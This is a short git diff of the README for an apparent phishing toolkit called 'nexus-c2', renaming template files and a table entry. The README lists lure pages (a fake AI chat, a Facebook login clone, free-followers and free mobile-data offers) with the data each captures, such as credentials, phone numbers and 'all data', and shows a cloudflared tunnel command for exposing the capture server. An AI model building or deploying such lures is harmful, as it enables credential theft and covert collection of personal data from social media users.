@@ -72,10 +72,10 @@ nexus-c2/
 │   ├── ai-chat.html
 │   ├── fb-followers.html
 │   ├── fb.html
-│   ├── free-data.html
+│   ├── free_data.html
 │   ├── google.html
 │   ├── ig.html
-│   ├── premium-offer.html
+│   ├── premium-insta-offer.html
 │   ├── secret-message.html
 │   └── ultimate.html
 │
@@ -198,7 +198,7 @@ cloudflared tunnel --url http://localhost:3000
 
 | Template | Description | Capture Features |
 |----------|-------------|------------------|
-| **Aura AI** | Futuristic AI chat interface | All data, auto-trigger after 2 messages |
+| **AI CHAT** | Futuristic AI chat interface | All data, auto-trigger after 2 messages |
 | **FB Followers** | Free Facebook followers offer | All data + Facebook URL |
 | **FB** | Classic Facebook login | Credentials + all data |
 | **Free Data** | 5GB mobile data giveaway | All data + phone number |
